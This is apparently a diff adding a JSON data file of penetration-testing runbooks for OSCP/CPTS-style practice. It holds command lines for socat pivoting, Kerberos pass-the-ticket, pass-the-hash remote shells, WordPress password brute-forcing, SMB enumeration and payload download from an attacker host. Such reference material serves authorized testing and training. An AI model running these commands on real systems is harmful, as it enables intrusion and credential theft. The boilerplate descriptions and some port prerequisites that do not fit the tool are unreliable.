+    "description": "<p>This runbook operationalizes <strong>Socat TCP Relay Pivoting</strong> using <span style=\"color:#ef4444;font-weight:bold;\">#socat</span>. It is designed for repeatable, high-signal execution in authorized OSCP/CPTS-style assessments.</p>\n<p>Builds simple TCP relays to bridge segmented networks and forward service access.</p>\n\n<ol>\n  <li><strong>Prepare scope and access:</strong> validate target reachability and select low-noise execution order.</li>\n  <li><strong>Execute core workflow:</strong> run the command chain to produce actionable security outcomes.</li>\n  <li><strong>Validate and operationalize output:</strong> confirm results, capture artifacts, and prepare follow-on actions.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> primary references are in local source corpus entries linked from <code>runbook-list.md</code>; e.g., <code>docs/sources-runbooks/oscp-cpts/p0/0x1ceKing-HTB-Certified-Penetration-Testing-Specialist/cheatsheet/Pivoting Tunneling Port Forwarding.md:44; docs/sources-runbooks/oscp-cpts/p0/0x1ceKing-HTB-Certified-Penetration-Testing-Specialist/cheatsheet/Pivoting Tunneling Port Forwarding.md:45</code>.</li>\n  <li><strong>Attack pre-requisite:</strong> authorized scope, operator shell access, and protocol reachability on <span style=\"color:#3b82f6;font-weight:bold;\">TCP 80</span>, <span style=\"color:#3b82f6;font-weight:bold;\">TCP 443</span>.</li>\n  <li><strong>What attacker gain:</strong> validated findings (access paths, credentials, execution context, or exposure evidence) enabling faster compromise progression.</li>\n  <li><strong>Detection/Defense opsec:</strong> monitor abnormal auth/enumeration bursts, enforce least privilege and hardening baselines, and alert on repeated tool-pattern telemetry.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>socat TCP4-LISTEN:8080,fork TCP4:&lt;IPaddressofAttackHost&gt;:80\nsocat TCP4-LISTEN:8080,fork TCP4:&lt;IPaddressofTarget&gt;:8443\nsocat TCP-LISTEN:&lt;LOCAL-PORT&gt;,fork TCP:&lt;REMOTE-IP&gt;:&lt;REMOTE-PORT&gt;</code></pre>",
+    "tags": [
+      "oscp-cpts",
+      "phase:pivoting",
+      "domain:offensive",
+      "tool:socat",
+      "focus:pivoting"
+    ]
+  },
+  {
+    "id": "cba09072-e142-5c5a-a202-6ad046647808",
+    "label": "Ticket Conversion and Pass-the-Ticket Injection",
+    "command": "impacket-ticketConverter <USERNAME>.ccache <USERNAME>.kirbi\nkerberos::ptt <KIRBI_FILE>\n./Rubeus.exe ptt /ticket:<KIRBI_FILE>",
+    "color": "#dc2626",
+    "description": "<p>This runbook operationalizes <strong>Ticket Conversion and Pass-the-Ticket Injection</strong> using <span style=\"color:#ef4444;font-weight:bold;\">#impacket</span> , <span style=\"color:#ef4444;font-weight:bold;\">#kerberos</span> , <span style=\"color:#ef4444;font-weight:bold;\">#rubeus.exe</span>. It is designed for repeatable, high-signal execution in authorized OSCP/CPTS-style assessments.</p>\n<p>Converts ticket formats and injects Kerberos tickets into active sessions for access reuse.</p>\n\n<ol>\n  <li><strong>Prepare scope and access:</strong> validate target reachability and select low-noise execution order.</li>\n  <li><strong>Execute core workflow:</strong> run the command chain to produce actionable security outcomes.</li>\n  <li><strong>Validate and operationalize output:</strong> confirm results, capture artifacts, and prepare follow-on actions.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> primary references are in local source corpus entries linked from <code>runbook-list.md</code>; e.g., <code>docs/sources-runbooks/oscp-cpts/p0/0xsyr0-OSCP/README.md:713; docs/sources-runbooks/oscp-cpts/p0/0xsyr0-OSCP/README.md:5901</code>.</li>\n  <li><strong>Attack pre-requisite:</strong> authorized scope, operator shell access, and protocol reachability on <span style=\"color:#3b82f6;font-weight:bold;\">TCP/UDP 88</span>.</li>\n  <li><strong>What attacker gain:</strong> validated findings (access paths, credentials, execution context, or exposure evidence) enabling faster compromise progression.</li>\n  <li><strong>Detection/Defense opsec:</strong> monitor abnormal auth/enumeration bursts, enforce least privilege and hardening baselines, and alert on repeated tool-pattern telemetry.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>impacket-ticketConverter &lt;USERNAME&gt;.ccache &lt;USERNAME&gt;.kirbi\nkerberos::ptt &lt;KIRBI_FILE&gt;\n.\\\\Rubeus.exe ptt /ticket:&lt;KIRBI_FILE&gt;</code></pre>",
+    "tags": [
+      "oscp-cpts",
+      "phase:credential-access",
+      "domain:ad",
+      "tool:impacket",
+      "focus:credentials"
+    ]
+  },
+  {
+    "id": "d18276f2-dc6f-5c66-8609-7a73f2c94562",
+    "label": "UDP Service Enumeration Workflow",
+    "command": "nmap -sU --script snmp-info <IP>\nsudo nmap -sU -sC -oN ./nmapUDP.txt <IP> --max-retries=1",
+    "color": "#dc2626",
+    "description": "<p>This runbook operationalizes <strong>UDP Service Enumeration Workflow</strong> using <span style=\"color:#ef4444;font-weight:bold;\">#nmap</span>. It is designed for repeatable, high-signal execution in authorized OSCP/CPTS-style assessments.</p>\n<p>Covers common low-noise UDP enumeration patterns, including SNMP-focused probing.</p>\n\n<ol>\n  <li><strong>Prepare scope and access:</strong> validate target reachability and select low-noise execution order.</li>\n  <li><strong>Execute core workflow:</strong> run the command chain to produce actionable security outcomes.</li>\n  <li><strong>Validate and operationalize output:</strong> confirm results, capture artifacts, and prepare follow-on actions.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> primary references are in local source corpus entries linked from <code>runbook-list.md</code>; e.g., <code>docs/sources-runbooks/oscp-cpts/p0/hackmd-oscp-pen200.md:23; docs/sources-runbooks/oscp-cpts/p0/n0xturne-OSCP-Cheat-Sheet-2024/README.md:70</code>.</li>\n  <li><strong>Attack pre-requisite:</strong> authorized scope, operator shell access, and protocol reachability on <span style=\"color:#3b82f6;font-weight:bold;\">UDP 161</span>.</li>\n  <li><strong>What attacker gain:</strong> validated findings (access paths, credentials, execution context, or exposure evidence) enabling faster compromise progression.</li>\n  <li><strong>Detection/Defense opsec:</strong> monitor abnormal auth/enumeration bursts, enforce least privilege and hardening baselines, and alert on repeated tool-pattern telemetry.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>nmap -sU --script snmp-info &lt;IP&gt;\nsudo nmap -sU -sC -oN ./nmapUDP.txt &lt;IP&gt; --max-retries=1</code></pre>",
+    "tags": [
+      "oscp-cpts",
+      "phase:recon",
+      "domain:network",
+      "tool:nmap",
+      "focus:enumeration"
+    ]
+  },
+  {
+    "id": "b7b86182-35e6-5356-a159-2f82f6cb0d2c",
+    "label": "WMI Remote Execution (Password and Hash)",
+    "command": "wmiexec.py test.local/john:password123@10.10.10.1\nwmiexec.py -hashes lmhash:nthash test.local/john@10.10.10.1\nwmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5",
+    "color": "#dc2626",
+    "description": "<p>This runbook operationalizes <strong>WMI Remote Execution (Password and Hash)</strong> using <span style=\"color:#ef4444;font-weight:bold;\">#impacket</span>. It is designed for repeatable, high-signal execution in authorized OSCP/CPTS-style assessments.</p>\n<p>Executes commands over WMI using either plaintext creds or NTLM hashes.</p>\n\n<ol>\n  <li><strong>Prepare scope and access:</strong> validate target reachability and select low-noise execution order.</li>\n  <li><strong>Execute core workflow:</strong> run the command chain to produce actionable security outcomes.</li>\n  <li><strong>Validate and operationalize output:</strong> confirm results, capture artifacts, and prepare follow-on actions.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> primary references are in local source corpus entries linked from <code>runbook-list.md</code>; e.g., <code>docs/sources-runbooks/oscp-cpts/p0/saisathvik1-OSCP-Cheatsheet/README.md:570; docs/sources-runbooks/oscp-cpts/p0/saisathvik1-OSCP-Cheatsheet/README.md:571</code>.</li>\n  <li><strong>Attack pre-requisite:</strong> authorized scope, operator shell access, and protocol reachability on <span style=\"color:#3b82f6;font-weight:bold;\">TCP 80</span>, <span style=\"color:#3b82f6;font-weight:bold;\">TCP 443</span>.</li>\n  <li><strong>What attacker gain:</strong> validated findings (access paths, credentials, execution context, or exposure evidence) enabling faster compromise progression.</li>\n  <li><strong>Detection/Defense opsec:</strong> monitor abnormal auth/enumeration bursts, enforce least privilege and hardening baselines, and alert on repeated tool-pattern telemetry.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>wmiexec.py test.local/john:password123@10.10.10.1\nwmiexec.py -hashes lmhash:nthash test.local/john@10.10.10.1\nwmiexec.py inlanefreight.local/wley:&#x27;transporter@4&#x27;@172.16.5.5</code></pre>",
+    "tags": [
+      "oscp-cpts",
+      "phase:credential-access",
+      "domain:windows",
+      "tool:impacket",
+      "focus:credentials"
+    ]
+  },
+  {
+    "id": "9bfe06d2-1b52-5b11-b387-189162f661c3",
+    "label": "WinPEAS Execution Modes for Windows PrivEsc",
+    "command": "winpeas.exe cmd searchall\nwinpeas.exe cmd\nwinpeas.exe systeminfo userinfo",
+    "color": "#dc2626",
+    "description": "<p>This runbook operationalizes <strong>WinPEAS Execution Modes for Windows PrivEsc</strong> using <span style=\"color:#ef4444;font-weight:bold;\">#winpeas</span>. It is designed for repeatable, high-signal execution in authorized OSCP/CPTS-style assessments.</p>\n<p>Runs focused/full WinPEAS checks to identify service, ACL, and credential privilege-escalation paths.</p>\n\n<ol>\n  <li><strong>Prepare scope and access:</strong> validate target reachability and select low-noise execution order.</li>\n  <li><strong>Execute core workflow:</strong> run the command chain to produce actionable security outcomes.</li>\n  <li><strong>Validate and operationalize output:</strong> confirm results, capture artifacts, and prepare follow-on actions.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> primary references are in local source corpus entries linked from <code>runbook-list.md</code>; e.g., <code>docs/sources-runbooks/oscp-cpts/p0/integration-it-active-directory-exploitation-cheat-sheet/Z - Tool Box/PEASS/winPEAS/winPEASexe/README.md:17; docs/sources-runbooks/oscp-cpts/p0/integration-it-active-directory-exploitation-cheat-sheet/Z - Tool Box/PEASS/winPEAS/winPEASexe/README.md:19</code>.</li>\n  <li><strong>Attack pre-requisite:</strong> authorized scope, operator shell access, and protocol reachability on <span style=\"color:#3b82f6;font-weight:bold;\">TCP 80</span>, <span style=\"color:#3b82f6;font-weight:bold;\">TCP 443</span>.</li>\n  <li><strong>What attacker gain:</strong> validated findings (access paths, credentials, execution context, or exposure evidence) enabling faster compromise progression.</li>\n  <li><strong>Detection/Defense opsec:</strong> monitor abnormal auth/enumeration bursts, enforce least privilege and hardening baselines, and alert on repeated tool-pattern telemetry.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>winpeas.exe cmd searchall\nwinpeas.exe cmd\nwinpeas.exe systeminfo userinfo</code></pre>",
+    "tags": [
+      "oscp-cpts",
+      "phase:privilege-escalation",
+      "domain:windows",
+      "tool:winpeas",
+      "focus:privilege-escalation"
+    ]
+  },
+  {
+    "id": "f69743f9-b7ca-5bf0-a8fc-ad4273c2f3f5",
+    "label": "WinRM Access and Pass-the-Hash Login",
+    "command": "evil-winrm -i <IP> -u <USER> -p <PASSWORD>\nevil-winrm -i <IP> -u <USER> -H <NTLM_HASH>",
+    "color": "#dc2626",
+    "description": "<p>This runbook operationalizes <strong>WinRM Access and Pass-the-Hash Login</strong> using <span style=\"color:#ef4444;font-weight:bold;\">#evil-winrm</span>. It is designed for repeatable, high-signal execution in authorized OSCP/CPTS-style assessments.</p>\n<p>Establishes interactive remote shell over WinRM with plaintext or hash material.</p>\n\n<ol>\n  <li><strong>Prepare scope and access:</strong> validate target reachability and select low-noise execution order.</li>\n  <li><strong>Execute core workflow:</strong> run the command chain to produce actionable security outcomes.</li>\n  <li><strong>Validate and operationalize output:</strong> confirm results, capture artifacts, and prepare follow-on actions.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> primary references are in local source corpus entries linked from <code>runbook-list.md</code>; e.g., <code>docs/sources-runbooks/oscp-cpts/p0/hackmd-oscp-pen200.md:141; docs/sources-runbooks/oscp-cpts/p0/hackmd-oscp-pen200.md:271</code>.</li>\n  <li><strong>Attack pre-requisite:</strong> authorized scope, operator shell access, and protocol reachability on <span style=\"color:#3b82f6;font-weight:bold;\">TCP 5985</span>, <span style=\"color:#3b82f6;font-weight:bold;\">TCP 5986</span>.</li>\n  <li><strong>What attacker gain:</strong> validated findings (access paths, credentials, execution context, or exposure evidence) enabling faster compromise progression.</li>\n  <li><strong>Detection/Defense opsec:</strong> monitor abnormal auth/enumeration bursts, enforce least privilege and hardening baselines, and alert on repeated tool-pattern telemetry.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>evil-winrm -i &lt;IP&gt; -u &lt;USER&gt; -p &lt;PASSWORD&gt;\nevil-winrm -i &lt;IP&gt; -u &lt;USER&gt; -H &lt;NTLM_HASH&gt;</code></pre>",
+    "tags": [
+      "oscp-cpts",
+      "phase:credential-access",
+      "domain:windows",
+      "tool:evil-winrm",
+      "focus:credentials"
+    ]
+  },
+  {
+    "id": "52ac7d4e-bc06-56c8-a87e-dd506f7ee7bd",
+    "label": "Windapsearch Privileged Account Enumeration",
+    "command": "windapsearch.py -h\npython3 windapsearch.py --dc-ip 172.16.5.5 -u inlanefreight/wley -p Klmcargo2 --da\npython3 windapsearch.py --dc-ip 172.16.5.5 -u inlanefreight/wley -p Klmcargo2 -PU",
+    "color": "#dc2626",
+    "description": "<p>This runbook operationalizes <strong>Windapsearch Privileged Account Enumeration</strong> using <span style=\"color:#ef4444;font-weight:bold;\">#windapsearch</span> , <span style=\"color:#ef4444;font-weight:bold;\">#python3</span>. It is designed for repeatable, high-signal execution in authorized OSCP/CPTS-style assessments.</p>\n<p>Enumerates domain admins and privileged user relationships over LDAP with valid creds.</p>\n\n<ol>\n  <li><strong>Prepare scope and access:</strong> validate target reachability and select low-noise execution order.</li>\n  <li><strong>Execute core workflow:</strong> run the command chain to produce actionable security outcomes.</li>\n  <li><strong>Validate and operationalize output:</strong> confirm results, capture artifacts, and prepare follow-on actions.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> primary references are in local source corpus entries linked from <code>runbook-list.md</code>; e.g., <code>docs/sources-runbooks/oscp-cpts/p0/0x1ceKing-HTB-Certified-Penetration-Testing-Specialist/cheatsheet/Active Directory Enumeration and Attacks.md:91; docs/sources-runbooks/oscp-cpts/p0/0x1ceKing-HTB-Certified-Penetration-Testing-Specialist/cheatsheet/Active Directory Enumeration and Attacks.md:92</code>.</li>\n  <li><strong>Attack pre-requisite:</strong> authorized scope, operator shell access, and protocol reachability on <span style=\"color:#3b82f6;font-weight:bold;\">TCP 389</span>.</li>\n  <li><strong>What attacker gain:</strong> validated findings (access paths, credentials, execution context, or exposure evidence) enabling faster compromise progression.</li>\n  <li><strong>Detection/Defense opsec:</strong> monitor abnormal auth/enumeration bursts, enforce least privilege and hardening baselines, and alert on repeated tool-pattern telemetry.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>windapsearch.py -h\npython3 windapsearch.py --dc-ip 172.16.5.5 -u inlanefreight\\\\wley -p Klmcargo2 --da\npython3 windapsearch.py --dc-ip 172.16.5.5 -u inlanefreight\\\\wley -p Klmcargo2 -PU</code></pre>",
+    "tags": [
+      "oscp-cpts",
+      "phase:recon",
+      "domain:offensive",
+      "tool:windapsearch",
+      "focus:enumeration"
+    ]
+  },
+  {
+    "id": "0bbba455-34aa-5a7d-aec1-8fd07bec61c8",
+    "label": "Windows File Transfer Primitives (LOLBIN + PowerShell)",
+    "command": "certutil -urlcache -split -f \"http://<LHOST>:<LPORT>/<FILE>\" <FILE>\niwr -uri http://<LHOST>:<LPORT>/<FILE> -Outfile <FILE>\nInvoke-WebRequest http://<LHOST>:<LPORT>/<FILE> -OutFile <FILE>",
+    "color": "#dc2626",
+    "description": "<p>This runbook operationalizes <strong>Windows File Transfer Primitives (LOLBIN + PowerShell)</strong> using <span style=\"color:#ef4444;font-weight:bold;\">#certutil</span> , <span style=\"color:#ef4444;font-weight:bold;\">#iwr</span> , <span style=\"color:#ef4444;font-weight:bold;\">#invoke-webrequest</span>. It is designed for repeatable, high-signal execution in authorized OSCP/CPTS-style assessments.</p>\n<p>Uses native binaries to retrieve payloads when external tooling is restricted.</p>\n\n<ol>\n  <li><strong>Prepare scope and access:</strong> validate target reachability and select low-noise execution order.</li>\n  <li><strong>Execute core workflow:</strong> run the command chain to produce actionable security outcomes.</li>\n  <li><strong>Validate and operationalize output:</strong> confirm results, capture artifacts, and prepare follow-on actions.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> primary references are in local source corpus entries linked from <code>runbook-list.md</code>; e.g., <code>docs/sources-runbooks/oscp-cpts/p0/n0xturne-OSCP-Cheat-Sheet-2024/README.md:1317; docs/sources-runbooks/oscp-cpts/p0/n0xturne-OSCP-Cheat-Sheet-2024/README.md:1323</code>.</li>\n  <li><strong>Attack pre-requisite:</strong> authorized scope, operator shell access, and protocol reachability on <span style=\"color:#3b82f6;font-weight:bold;\">TCP 80</span>, <span style=\"color:#3b82f6;font-weight:bold;\">TCP 443</span>.</li>\n  <li><strong>What attacker gain:</strong> validated findings (access paths, credentials, execution context, or exposure evidence) enabling faster compromise progression.</li>\n  <li><strong>Detection/Defense opsec:</strong> monitor abnormal auth/enumeration bursts, enforce least privilege and hardening baselines, and alert on repeated tool-pattern telemetry.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>certutil -urlcache -split -f &quot;http://&lt;LHOST&gt;:&lt;LPORT&gt;/&lt;FILE&gt;&quot; &lt;FILE&gt;\niwr -uri http://&lt;LHOST&gt;:&lt;LPORT&gt;/&lt;FILE&gt; -Outfile &lt;FILE&gt;\nInvoke-WebRequest http://&lt;LHOST&gt;:&lt;LPORT&gt;/&lt;FILE&gt; -OutFile &lt;FILE&gt;</code></pre>",
+    "tags": [
+      "oscp-cpts",
+      "phase:initial-access",
+      "domain:web",
+      "tool:certutil",
+      "focus:enumeration"
+    ]
+  },
+  {
+    "id": "f0fa3212-77c0-526b-a854-21b5dc9251df",
+    "label": "Windows PrivEsc Initial Triage",
+    "command": "whoami /priv\nsysteminfo\nwhoami /all",
+    "color": "#dc2626",
+    "description": "<p>This runbook operationalizes <strong>Windows PrivEsc Initial Triage</strong> using <span style=\"color:#ef4444;font-weight:bold;\">#whoami</span> , <span style=\"color:#ef4444;font-weight:bold;\">#systeminfo</span>. It is designed for repeatable, high-signal execution in authorized OSCP/CPTS-style assessments.</p>\n<p>Establishes token privilege posture, OS build, and patch context for exploit path selection.</p>\n\n<ol>\n  <li><strong>Prepare scope and access:</strong> validate target reachability and select low-noise execution order.</li>\n  <li><strong>Execute core workflow:</strong> run the command chain to produce actionable security outcomes.</li>\n  <li><strong>Validate and operationalize output:</strong> confirm results, capture artifacts, and prepare follow-on actions.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> primary references are in local source corpus entries linked from <code>runbook-list.md</code>; e.g., <code>docs/sources-runbooks/oscp-cpts/p0/n0xturne-OSCP-Cheat-Sheet-2024/README.md:869; docs/sources-runbooks/oscp-cpts/p0/n0xturne-OSCP-Cheat-Sheet-2024/README.md:888</code>.</li>\n  <li><strong>Attack pre-requisite:</strong> authorized scope, operator shell access, and protocol reachability on <span style=\"color:#3b82f6;font-weight:bold;\">TCP 80</span>, <span style=\"color:#3b82f6;font-weight:bold;\">TCP 443</span>.</li>\n  <li><strong>What attacker gain:</strong> validated findings (access paths, credentials, execution context, or exposure evidence) enabling faster compromise progression.</li>\n  <li><strong>Detection/Defense opsec:</strong> monitor abnormal auth/enumeration bursts, enforce least privilege and hardening baselines, and alert on repeated tool-pattern telemetry.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>whoami /priv\nsysteminfo\nwhoami /all</code></pre>",
+    "tags": [
+      "oscp-cpts",
+      "phase:privilege-escalation",
+      "domain:windows",
+      "tool:whoami",
+      "focus:privilege-escalation"
+    ]
+  },
+  {
+    "id": "209b3b2d-f7b8-5ef2-a0b5-7bcc2c7234fe",
+    "label": "WordPress Enumeration and Credential Attack",
+    "command": "wpscan --url <URL> --enumerate p --plugins-detection aggressive\nwpscan --url <URL> --enumerate u\nwpscan --url <URL> -U users.txt -P /usr/share/wordlists/rockyou.txt",
+    "color": "#dc2626",
+    "description": "<p>This runbook operationalizes <strong>WordPress Enumeration and Credential Attack</strong> using <span style=\"color:#ef4444;font-weight:bold;\">#wpscan</span>. It is designed for repeatable, high-signal execution in authorized OSCP/CPTS-style assessments.</p>\n<p>Enumerates vulnerable WordPress components/users then runs targeted credential attacks.</p>\n\n<ol>\n  <li><strong>Prepare scope and access:</strong> validate target reachability and select low-noise execution order.</li>\n  <li><strong>Execute core workflow:</strong> run the command chain to produce actionable security outcomes.</li>\n  <li><strong>Validate and operationalize output:</strong> confirm results, capture artifacts, and prepare follow-on actions.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> primary references are in local source corpus entries linked from <code>runbook-list.md</code>; e.g., <code>docs/sources-runbooks/oscp-cpts/p0/hackmd-oscp-pen200.md:444; docs/sources-runbooks/oscp-cpts/p0/hackmd-oscp-pen200.md:448</code>.</li>\n  <li><strong>Attack pre-requisite:</strong> authorized scope, operator shell access, and protocol reachability on <span style=\"color:#3b82f6;font-weight:bold;\">TCP 3389</span>, <span style=\"color:#3b82f6;font-weight:bold;\">TCP 80</span>, <span style=\"color:#3b82f6;font-weight:bold;\">TCP 443</span>.</li>\n  <li><strong>What attacker gain:</strong> validated findings (access paths, credentials, execution context, or exposure evidence) enabling faster compromise progression.</li>\n  <li><strong>Detection/Defense opsec:</strong> monitor abnormal auth/enumeration bursts, enforce least privilege and hardening baselines, and alert on repeated tool-pattern telemetry.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>wpscan --url &lt;URL&gt; --enumerate p --plugins-detection aggressive\nwpscan --url &lt;URL&gt; --enumerate u\nwpscan --url &lt;URL&gt; -U users.txt -P /usr/share/wordlists/rockyou.txt</code></pre>",
+    "tags": [
+      "oscp-cpts",
+      "phase:lateral-movement",
+      "domain:web",
+      "tool:wpscan",
+      "focus:web-testing"
+    ]
+  },
+  {
+    "id": "ba524e9f-6a4d-5f69-844a-e4551ad61369",
+    "label": "enum4linux / enum4linux-ng SMB Domain Sweep",
+    "command": "enum4linux -a {IP}\n./enum4linux-ng.py 10.10.11.45 -A -C\nenum4linux-ng -A <RHOST>",
+    "color": "#dc2626",
+    "description": "<p>This runbook operationalizes <strong>enum4linux / enum4linux-ng SMB Domain Sweep</strong> using <span style=\"color:#ef4444;font-weight:bold;\">#enum4linux</span> , <span style=\"color:#ef4444;font-weight:bold;\">#enum4linux-ng.py</span> , <span style=\"color:#ef4444;font-weight:bold;\">#enum4linux-ng</span>. It is designed for repeatable, high-signal execution in authorized OSCP/CPTS-style assessments.</p>\n<p>Rapid unauthenticated SMB/domain recon for users, shares, and policy indicators.</p>\n\n<ol>\n  <li><strong>Prepare scope and access:</strong> validate target reachability and select low-noise execution order.</li>\n  <li><strong>Execute core workflow:</strong> run the command chain to produce actionable security outcomes.</li>\n  <li><strong>Validate and operationalize output:</strong> confirm results, capture artifacts, and prepare follow-on actions.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> primary references are in local source corpus entries linked from <code>runbook-list.md</code>; e.g., <code>docs/sources-runbooks/oscp-cpts/p0/hackmd-oscp-pen200.md:85; docs/sources-runbooks/oscp-cpts/p0/0x1ceKing-HTB-Certified-Penetration-Testing-Specialist/cheatsheet/Attack Common Services.md:22</code>.</li>\n  <li><strong>Attack pre-requisite:</strong> authorized scope, operator shell access, and protocol reachability on <span style=\"color:#3b82f6;font-weight:bold;\">TCP 445</span>.</li>\n  <li><strong>What attacker gain:</strong> validated findings (access paths, credentials, execution context, or exposure evidence) enabling faster compromise progression.</li>\n  <li><strong>Detection/Defense opsec:</strong> monitor abnormal auth/enumeration bursts, enforce least privilege and hardening baselines, and alert on repeated tool-pattern telemetry.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>enum4linux -a {IP}\n./enum4linux-ng.py 10.10.11.45 -A -C\nenum4linux-ng -A &lt;RHOST&gt;</code></pre>",
+    "tags": [
+      "oscp-cpts",
+      "phase:recon",
+      "domain:linux",
+      "tool:enum4linux",
+      "focus:enumeration"
+    ]
+  }
+]
